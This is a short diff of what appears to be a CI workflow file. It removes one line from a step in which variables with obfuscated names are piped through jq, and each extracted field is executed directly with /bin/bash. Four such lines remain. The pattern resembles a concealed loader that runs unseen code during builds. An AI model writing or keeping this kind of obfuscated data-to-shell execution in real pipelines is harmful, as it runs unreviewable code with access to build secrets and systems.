@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$d807" | jq -r .pjtpd7215 | /bin/bash
           echo $fysaj284 | jq -r .yd6554 | /bin/bash
           echo $w22069 | jq -r .l013 | /bin/bash
-          printf '%s' "$e8" | jq -r .d7 | /bin/bash
           echo $kaghf5954 | jq -r .jzogr0 | /bin/bash
 
       - name: Store results
